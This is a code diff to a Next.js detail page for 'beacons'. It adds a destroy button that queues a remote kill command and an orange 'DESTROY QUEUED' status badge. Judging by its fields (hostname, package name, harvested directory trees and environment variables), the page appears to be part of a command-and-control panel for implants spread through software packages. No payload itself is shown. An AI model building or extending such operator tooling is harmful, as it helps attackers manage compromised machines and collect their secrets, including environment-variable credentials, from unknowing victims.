@@ -1,5 +1,6 @@
 import db, { type Beacon } from '@/lib/db';
 import { notFound } from 'next/navigation';
+import { destroyBeacon } from '../actions';
 
 export const dynamic = 'force-dynamic';
 
@@ -37,13 +38,30 @@ export default async function BeaconDetailPage({ params }: { params: Promise<{ i
   try { dirTree = JSON.parse(beacon.dir_tree || '[]'); } catch (_) {}
   try { envVars = JSON.parse(beacon.env_vars || '{}'); } catch (_) {}
 
+  const destroyed = beacon.kill === 1;
+
   return (
     <div className="space-y-4 max-w-3xl">
       <div className="flex items-center gap-3">
-        <span className={`inline-block w-2.5 h-2.5 rounded-full ${alive ? 'bg-green-400' : 'bg-red-600'}`} />
+        <span className={`inline-block w-2.5 h-2.5 rounded-full ${destroyed ? 'bg-orange-500' : alive ? 'bg-green-400' : 'bg-red-600'}`} />
         <h1 className="text-lg font-bold">{beacon.hostname || beacon.beacon_id}</h1>
         <span className="text-gray-400 text-sm">{beacon.pkg_name}</span>
+        {destroyed && <span className="text-xs text-orange-400 border border-orange-800 px-1.5 py-0.5 rounded">DESTROY QUEUED</span>}
       </div>
+
+      {destroyed ? (
+        <div className="text-sm text-orange-400 border border-orange-900 bg-orange-950/30 px-3 py-2 rounded">
+          destroy command queued
+          {beacon.destroyed_at && <> — {new Date(beacon.destroyed_at * 1000).toLocaleString()}</>}
+        </div>
+      ) : (
+        <form action={destroyBeacon}>
+          <input type="hidden" name="id" value={beacon.id} />
+          <button type="submit" className="text-xs px-3 py-1.5 bg-red-900 hover:bg-red-700 text-red-200 rounded">
+            destroy
+          </button>
+        </form>
+      )}
 
       <Section title="SYSTEM">
         <KV label="hostname" value={beacon.hostname} />
